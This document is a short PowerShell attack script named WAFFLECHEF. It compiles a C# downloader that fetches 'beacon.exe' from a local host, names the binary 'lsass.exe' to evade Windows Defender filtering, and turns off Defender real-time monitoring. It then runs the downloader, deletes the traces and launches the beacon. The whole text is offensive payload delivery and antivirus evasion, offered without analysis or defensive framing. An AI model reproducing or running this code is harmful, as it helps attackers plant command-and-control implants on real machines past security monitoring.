# WAFFLECHEF

$code = @'
class Program 
{
    static void Main() {
        System.IO.File.WriteAllBytes(
            "beacon-FILENAME", 
            new System.Net.WebClient().DownloadData(
                "http://192.168.1.41:8000/beacon.exe"
            )
        );
    }
}
'@


echo "`nWill download file: http://192.168.1.41:8000/beacon.exe`n"

#
# WdFilter.sys - .rdata section
#
$files = @(
	"lsass.exe"
)

#
# Disable Real-Time monitoring just to acquire hahes.
# Files were already downloaded flying pass the Defender.
#
Set-MpPreference -DisableRealtimeMonitoring $true
Sleep 15

$files | % {
    $out = '{0}.cs' -f ($_ -replace '.exe', '')
    ($code -replace 'FILENAME', $_) | Out-File $out

    echo "Compiling as $_ ..."

    iex "$($env:windir)\Microsoft.NET\Framework64\v4.0.30319\csc.exe $out" `
                 | Out-Null
    
    echo "Downloading Malware-$_ ... `n"
    iex "& .\$_" | Out-Null

    del $out     | Out-Null
    del $_       | Out-Null
}

start C:\Users\Administrator\Desktop\beacon-lsass.exe

